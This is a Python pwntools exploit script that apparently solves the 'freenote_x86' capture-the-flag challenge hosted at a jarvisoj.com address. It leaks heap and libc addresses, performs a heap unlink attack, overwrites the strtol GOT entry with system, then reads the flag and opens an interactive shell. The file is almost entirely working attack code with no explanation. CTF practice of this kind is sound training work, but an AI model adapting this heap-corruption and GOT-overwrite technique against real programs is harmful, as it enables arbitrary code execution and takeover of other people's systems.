#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
from sys import argv
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

if argv[1] =='l':
    io = process('./freenote_x86')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    # gdb.attach(io, 'b * 0x8048a63')
    raw_input('->')
    main_arena_offset = 0x1b3780
else:
    io = remote('pwn2.jarvisoj.com', 9885)
    libc  = ELF('./libc-2.19.so')
    main_arena_offset = 0x1ab420
elf = ELF('./freenote_x86')

def addpost(lenth,post):
    io.sendlineafter('choice: ', '2')
    io.sendlineafter('note: ', str(lenth))
    io.sendafter('note: ', post)


def showpost():
    io.sendlineafter('choice: ', '1')


def editpost(no, lenth, post):
    io.sendlineafter('choice: ', '3')
    io.sendlineafter('number: ', str(no))
    io.sendlineafter('note: ', str(lenth))
    io.sendafter('note: ', post)


def deletepost(no):
    io.sendlineafter('choice: ', '4')
    io.sendlineafter('number: ', str(no))

if __name__ == "__main__":
    for i in range(5):
        addpost(128, str(i) * 128)
    deletepost(3)
    deletepost(1)

    # leak the heap address and libc base
    editpost(0,0x88,'a' * 0x86 + '>>')
    showpost()
    io.recvuntil('>>')
    leakinfo = io.recvuntil('=')
    # print leakinfo
    # raw_input()
    heap_addr = u32(leakinfo[:4]) - 0xdb0
    libc_base = u32(leakinfo[4:8]) - main_arena_offset - 48

    success('heap_addr -> ' + hex(heap_addr))
    success('libc_base -> ' + hex(libc_base))
    sys_addr = libc_base + libc.symbols['system']
    strtol_got = elf.got['strtol']
    ptr0 = heap_addr + 0x18
    success('system -> ' + hex(sys_addr))
    success('strtol -> ' + hex(strtol_got))
    success('ptr0 -> ' + hex(ptr0))
    raw_input('-> ')
    # unlink
    payload = p32(0x88) + p32(0x80) + p32(ptr0 - 0xc) + p32(ptr0 - 0x8) 
    payload = payload.ljust(0x80, 'b')
    payload += p32(0x80) + p32(0x88)
    editpost(0, len(payload), payload)
    deletepost(1)

    # rewrite got  
    payload = p32(2) + p32(1) + p32(0x88) + p32(ptr0 - 0xc)
    payload += p32(1) + p32(4) + p32(elf.got['strtol'])
    payload = payload.ljust(0x88, 'c')
    editpost(0, len(payload), payload)

    editpost(1, 4, p32(sys_addr))

    io.readuntil('choice: ')
    io.sendline('cat flag')
    io.interactive()
